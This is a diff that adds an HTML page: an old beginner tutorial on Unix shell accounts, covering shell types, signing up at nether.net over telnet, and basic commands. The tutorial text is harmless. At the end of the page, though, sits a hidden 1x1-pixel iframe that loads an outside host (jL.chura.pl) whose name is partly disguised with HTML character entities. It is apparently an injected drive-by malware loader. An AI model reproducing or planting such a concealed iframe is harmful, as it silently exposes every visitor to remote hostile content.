@@ -1,0 +1,342 @@
+<html>
+<head>
+<title>shell</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+
+<body bgcolor="#FFFFFF" text="#000000">
+<table width="680" border="0" cellspacing="2" cellpadding="2" align="center">
+  <tr> 
+    <td width="693"> 
+      <pre>
+                        :::::::::   ::::::::  :::::::::  :::::::::: 
+                        :+:    :+: :+:    :+: :+:    :+: :+:        
+                        +:+    +:+ +:+        +:+    +:+ +:+        
+                        +#++:++#+  +#++:++#++ +#++:++#:  :#::+::#   
+                        +#+    +#+        +#+ +#+    +#+ +#+        
+                        #+#    #+# #+#    #+# #+#    #+# #+#        
+                        #########   ########  ###    ### ###  
+                         
+              	             <a href="%20http://blacksun.box.sk" target="_blank">http://blacksun.box.sk</a>
+                           _____________________________
+    ______________________I       <b>   Topic:</b>             I_____________________
+   \                      I                             I                    /
+    \     HTML by:        I  <b>Shell Accounts For Newbies</b> I   Written by:     /
+    >                     I                             I                  < 
+   /      <a href="mailto:black_mesa@gmx.de">Martin L.</a>       I_____________________________I   <a href="mailto:Ghost_Rider9@hotmail.com">Ghost_Rider</a>     \
+  /___________________________>                    <_________________________\</pre>
+    </td>
+  </tr>
+</table>
+<p>This is a tutorial explaining what a shell account is, how you can get one 
+  and some basic commands. If you are thinking that you can find here shell scripting 
+  or exploit hints, you are wrong. Wait for further tutorials. The first part 
+  is just a bunch of questions with answers. After that I'll do a quick view about 
+  shell flavours and where can you get shells for free.<br>
+  So here we go.</p>
+<p><b><font size="4">The Questions That Everybody Asks</font></b></p>
+<p><b>Q:What is a shell account?</b></p>
+<p><b>A:</b>Ok...I think I won't be needing to explain what an account is, but 
+  let's talk about the shell. You probably are using Windows, so your shell is 
+  command.com and all that cute (crashing) Graphic environment. Being more precise 
+  a shell is the program that translates and sends your commands to your system's 
+  core. This happens because the core doesn't understand the commands you give. 
+  For example, when you type &quot;cd ..&quot;, this command will be first translate 
+  to a low language level by the shell and just after that, sent to the core (or 
+  your CPU would drive mad). Do you imagine how painful would be using a computer 
+  if you hadn't a shell? You needed to use a low language level, like assembler 
+  or even worst (binary) to do something. If you wanted to do &quot;cd ..&quot; 
+  you would have to write a bunch of push mem put mem blabla mem or a huge list 
+  of 00101010. Do you really think that this would work with people? I don't think 
+  so. Ok..Ok.. There are many persons that code in assembler, but I'm talking 
+  about ordinary people.</p>
+<p>&nbsp;</p>
+<p><b>Q:So you are saying that a shell is just a &quot;thing&quot; that translates 
+  my inputs to the core, like command.com. But why do I want to connect to a remote 
+  command.com, I've got my own in my box.</b></p>
+<p><b>A:</b> People like Shell Accounts because you don't connect to a Windows 
+  box, but to a *nix box. If you can't have linux or any other *nix System at 
+  home, you could get a Shell Account, and start playing with linux like if it 
+  was in your own box.</p>
+<p>&nbsp;</p>
+<p><b>Q:My friend is a *nix guru and he told me that some shells suck because 
+  they are restricted what's that?</b></p>
+<p>A:There are two kind of shells, the restricted shells and the non-restricted 
+  shells. The difference between both is that usually restricted shells aren't 
+  rented, they are free shells, but in those shells you can't execute every command 
+  you want (for example, using a free shell they can keep you out of dig, nslookup 
+  and telnet programs). On the therhand using non-restricted shells, you can run 
+  any command you want but these kind of shells are paid (sometimes universities 
+  give non-restricted shells to the students). Hey, but even if you have a restricted 
+  shell don't be worried, some of them are really good.</p>
+<p>&nbsp;</p>
+<p><b>Q: So you are saying that I can get a shell without paying for it?</b></p>
+<p><b>A:</b> Yes you can. For me the best place is at nether.net (other host that 
+  is a free shell provider is freeshell.org), I'll guide you through the all process 
+  later. Sometimes ISPs also give shell accounts to their users, so you may have 
+  already a shell account and you don't know, phone to yours ISP's Support and 
+  talk with them.</p>
+<p>&nbsp;</p>
+<p><b>Q: I phoned my ISP asking for a shell account, and they asked why did I 
+  want one. What should I say?</b></p>
+<p><b>A:</b> Just tell that you really love to surf with Lynx, and that you want 
+  to learn Unix. That should do. If they hang up, just go for the free shells.</p>
+<p>&nbsp;</p>
+<p><b>Q: Hey I've got a shell, but how can I know if it's a good shell?</b></p>
+<p>A: I think the answer is relative, it depends from the person who answer, for 
+  me the things that make a good shell are listed below.</p>
+<p>-&gt; Telnet (terminal emulator)<br>
+  -&gt; Nslookup (Gives you information about the host)<br>
+  -&gt; FTP (File Transfer Protocol, do I need to say anything else?)<br>
+  -&gt; Finger (gets information about some user)<br>
+  -&gt; Traceroute (The same as tracerT.exe in Windows, but much better)<br>
+  -&gt; Dig (probably many of the restricted shells won't let you use, but don't 
+  worry)<br>
+  -&gt; Netstat (like in windows, lists all sockets and their status)<br>
+  -&gt; GCC (c compiler, cool to do your own coding)<br>
+  -&gt; Gzip (to [un]pack stuff)<br>
+  -&gt; Lynx (Best Browser in the World)</p>
+<p>This doesn't mean that a good shell for you needs to have this. For you a good 
+  shell could be just a shell that allows you to telnet, like I said it's very 
+  relative. But if your shell account doesn't let you use telnet, FTP and GCC, 
+  you should get other shell account.</p>
+<p>By now you should be getting bored of reading stupid questions, and even more 
+  stupid answers, so let's get in another section. Let's talk a little about the 
+  flavours of Shell Accounts.</p>
+<p>&nbsp;</p>
+<p><b><font size="4">Quick View about flavours of Shell Accounts</font></b></p>
+<p>There are may kinds of shell accounts, some of them are what we call home made 
+  shells, other are the &quot;standard&quot; shell. Let's talk about the &quot;standard&quot; 
+  shells.</p>
+<blockquote>
+  <p><b>Just for your information</b></p>
+  <p>Home made shells are shells that are made by the sysop that owns the system, 
+    <br>
+    and it's just running in his system.</p>
+</blockquote>
+<p>Like I said there are plenty of shells.You've got:</p>
+<p>-&gt; shell: Bourne Shell<br>
+  -&gt; Bash : Bourne Again Shell<br>
+  -&gt; Cshell: C Shell<br>
+  -&gt; Tcsh: Technical C Shell<br>
+  -&gt; Ksh: Kourne Shell<br>
+  And many others. (I just listed those because it's the ones you can get at nether.net)</p>
+<p>Each shell has their strong and weak points. For example the Cshell allows 
+  you to type in C commands like if it were normal commands, that means that if 
+  you type printf Hello it will be the same as echo in other shells(for the ones 
+  who don't know C language, printf stands for printing in the screen the input 
+  given). I won't explain the strong and weak points in each shell, you should 
+  be the one doing that. Just get them at free shell providers at start exploring. 
+  The only hint I'll give you is that Bash is the best shell for beginners, if 
+  you want a more powerful shell just go to the C shell. Start with bash, explore 
+  the system, learn some bash scripting, then start using other shells. Talk with 
+  your friends that have others shells, ask what they think about it, you're getting 
+  the idea, aren't you?;) If you already have one shell and doesn't know which 
+  shell is it, just type in echo $shell and it will probably be shown your shell's 
+  type. Since this is a quick view, I'll end here. Gonna help you getting a real 
+  cool shell account.</p>
+<p>&nbsp;</p>
+<p><b><font size="4">Getting a Shell Account At Nether.net</font></b></p>
+<p>So are you ready to get your first shell account? Of course you are. The only 
+  thing I don't like in nether.net is the offline time that the server sometimes 
+  stays. So if you can connect to nether.net don't worry, since there are plenty 
+  of people in that host sometimes he overflows and goes offline. Just wait some 
+  hours and you probably can go online again.</p>
+<p><b>------ Accessing nether.net ------</b></p>
+<p><b>Step 1. (Getting your terminal emulator ready to roll)</b></p>
+<blockquote>
+  <p>Open your telnet program, you can find it in windows directory under the 
+    name telnet.exe</p>
+</blockquote>
+<p><br>
+  <b>Step 2. (Connecting)</b></p>
+<blockquote>
+  <p>Now that you are probably looking to the Telnet Window, select the Connect 
+    menu, and in that menu select Remote System. It will be shown another box 
+    asking you for the hostname, port and term type. Fill those fields with the 
+    information below.</p>
+  <p>Hostname: nether.net<br>
+    Port: Telnet (or 23 it's the same)<br>
+    Term Type: vt100 (it should be already in this value)</p>
+  <p>You wait a little and...</p>
+</blockquote>
+<p><b>------ Getting the account ------</b></p>
+<p><b>Step 3. (Logging in)</b></p>
+<blockquote>
+  <p>Now you should be looking at the nether.net banner. That says:</p>
+  <p><br>
+    Kernel SunOS 5.6 Generic_105181-17 on a sun4d<br>
+    Welcome to nether.net</p>
+  <p>New to the system? Login as newuser</p>
+  <p>login:</p>
+  <p>Now like they say use newuser as login. A program called newuser will start, 
+    helping you creating an account.</p>
+</blockquote>
+<p><br>
+  <b>Step 4. (Customising Keys)</b></p>
+<blockquote>
+  <p>After a bunch of crap, the newuser program will ask you to Customise keys. 
+    It will be asked the delete key (^H) and the break key (^C). What is in brackets 
+    are the default if you want you can choose any other. The ^H stands for the 
+    delete key (the one that has the &lt;- symbol on it), and the ^C stands for 
+    ctrl+c. Attention don't write ^H or ^C just press the keys, and that will 
+    be the output.</p>
+</blockquote>
+<p><br>
+  <b>Step 5. (Selecting Terminal Type)</b></p>
+<blockquote>
+  <p>After you customise the keys you'll be asked to enter your terminal type, 
+    you can select ? and the program will print you all the terminals support 
+    by it, but you should select vt100 or just press enter. Pressing enter the 
+    program will assume that your terminal is a dumb terminal. There is no problem 
+    to select the dumb terminal because you can change it later.</p>
+</blockquote>
+<p><br>
+  <b>Step 6. (Personal Data)</b></p>
+<blockquote>
+  <p>It will be asked things like your full name, phone number, birth date, sex, 
+    blablab, your getting the idea. If you want you can just put a . and press 
+    enter. You can also give fake information, I think that 98% of the users at 
+    nether.net did that. In the end of all the questions you'll be asked if you 
+    want to hide the information from other users. Just say yes or no, I suggest 
+    you to say yes.</p>
+</blockquote>
+<p><br>
+  <b>Step 7. (Selecting Shell)</b></p>
+<p>Now it will be shown a list with the legal shells, just select one, like I 
+  said before if you are new to shell accounts choose bash shell.</p>
+<p><br>
+  <b>Step 8. (Selecting Login)</b></p>
+<p>Just select your login, like always 8 chars is the max length.</p>
+<p><br>
+  <b>Step 9. (Selecting Password)</b></p>
+<p>Select a password, it will be asked two times to see if the password is correct. 
+  You can change the password later using the passwd command later.</p>
+<p><b>Step 10. (Accepting Choices)</b></p>
+<p>At this time you should be looking to something like:</p>
+<table width="93%" border="0" cellspacing="2" cellpadding="2">
+  <tr> 
+    <td>full name:</td>
+    <td>Full Name</td>
+  </tr>
+  <tr> 
+    <td>loginid: your username password:</td>
+    <td> &lt;suppressed&gt;</td>
+  </tr>
+  <tr> 
+    <td>address:</td>
+    <td>your address if you gave any</td>
+  </tr>
+  <tr> 
+    <td>telephone:</td>
+    <td>your phone number if you gave any</td>
+  </tr>
+  <tr> 
+    <td>other e-mail addresses:</td>
+    <td>your e-mail address if you gave any</td>
+  </tr>
+  <tr> 
+    <td>occupation:</td>
+    <td>The same here</td>
+  </tr>
+  <tr> 
+    <td>computers:</td>
+    <td>Same</td>
+  </tr>
+  <tr> 
+    <td>birthdate:</td>
+    <td>Some date sex: Also something here</td>
+  </tr>
+  <tr> 
+    <td>interests:</td>
+    <td>Something how (did you find out about us): How do you find them</td>
+  </tr>
+  <tr> 
+    <td>Privacy switch</td>
+    <td>on/off</td>
+  </tr>
+  <tr>
+    <td>shell:</td>
+    <td>your shell account terminal: your terminal type erase '^H' kill '^U' interrupt 
+      '^C'</td>
+  </tr>
+</table>
+<p>Type &quot;help&quot; for a list of things you can change.</p>
+<p>Select thing to change or &quot;done&quot;?</p>
+<p>Now if you agree with all the data just type done and press enter, or if you 
+  want to change something just type the you want to change field.</p>
+<p><b><br>
+  Step 11. (After You type Done)</b></p>
+<p>Now the program is checking if there is already your username, you should be 
+  seeing a bunch of numbers scrolling, it's normal don't get scared... Now if 
+  your Login name already exists will be asked another, if there isn't the system 
+  will encrypt your password, and you'll stay for some time watching a bunch of 
+  numbers scrolling. After that....</p>
+<p><b><br>
+  Step 12. (Congratulations You have a shell account)</b></p>
+<p>Yep you've got a shell account, now you should be again in the login sequence 
+  and your login name is already written just type in the password, press enter 
+  and have fun.Remember that you can have many shells has you want. So if you 
+  want you can login again with newuser but instead of choosing a bash shell choose 
+  a Cshell and all the others or a shell bash again...</p>
+<p><b><font size="4">The commands</font></b></p>
+<p>Hi won't talk about of every command that exists in *nix systems, if I did 
+  that the file would become huge. If you want to a big amount of information 
+  about commands check the final notes section. The basic commands are listed 
+  below with their function.</p>
+<p>Syntax: command [switches] -&gt; description</p>
+<p>man [command] -&gt; display the manual entry about the [command] you gave.</p>
+<p>cd [directory] -&gt; like in DOS it changes your current directory, to go one 
+  directory up you also use .., if you want to return to your home directory just 
+  type cd without the [directory] parameter.</p>
+<p>ls [-al] -&gt; ls makes the same as dir in DOS, it lists every file in the 
+  directory, the -al is some of the switch you can use. Using this two switch 
+  the listing will be displayed with hidden files, file permission, group and 
+  owner. To know all the other switches man ls.</p>
+<p>cat [file] -&gt; it's the same as the command type in DOS, it displays the 
+  <br>
+  content of the [file] given.</p>
+<p>logout -&gt; Logs you out from your shell account.</p>
+<p>who -&gt; Shows who's online, with information about those users. There are 
+  programs that make you invisible to the who command, but that's another story, 
+  probably in another tutorial.</p>
+<p>ps [-aux] -&gt; ps shows every procedure that is running, something like ctrl+alt+del 
+  in windows (not to reboot, but to show what's running) but much more powerful 
+  since it isn't known how we can run a program without being display in ps. If 
+  you run ps with no switches it will just show your own processes, if you use 
+  the switch -aux it will list every process that is running in the machine.</p>
+<p>joe [file] -&gt; joe is a text editor, it edits or creates the [file] given. 
+</p>
+<p>Sometimes the shell providers haven't joe but they should have vi (another 
+  text editor).</p>
+<p><br>
+  This command should be enough for you to start. Also use man command in the 
+  commands that we talk to get a bigger and more detailed description about it. 
+  Good surfing!</p>
+<p><b><font size="4">Final Notes</font></b></p>
+<p>Now what you need is a little of practice, and good books to get in touch with 
+  the commands. One of the best *nix books is UNIX IN A NUTSHELL. You can find 
+  it in the books section at BSRF WWW page (<a href="http://blacksun.box.sk" target="_blank">http://blacksun.box.sk</a>). 
+  For me, this is the best book about the subject, and since it's free I strongly 
+  recommend you to get it. Another good thing is man. For example, if you want 
+  to get some information about telnet, and how to use it, you just type in:</p>
+<blockquote>
+  <p> man telnet</p>
+</blockquote>
+<p>And it will be prompt the manual page about telnet. If you are using a shell 
+  in the freeshell server (<a href="http://freeshel.org" target="_blank">freeshell.org</a>) 
+  you can also use the command help without any options. This will call you a 
+  menu with the options you can call. And keep in mind that *nix is Case Sensitive 
+  so Man, man and MaN or .profile and .Profile isn't the same thing.</p>
+<p><br>
+  <b>Appendixes</b><br>
+  ----------<br>
+  A) Can I run IRC bots on free shell accounts? (by R a v e N) No!! Unless you 
+  intend to be logged into your shell 24 hours a day. Free shell providers will 
+  kill all of your running processes (running programs in the Windows world) once 
+  you log off.</p>
+<p>B) Are there are other places in which I can get a shell account? (by <a href="mailto:barakirs@netvision.net.il">R 
+  a v e N</a>) Of course! Try <a href="http://www.cyberarmy.com/lists" target="_blank">http://www.cyberarmy.com/lists</a></p>
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
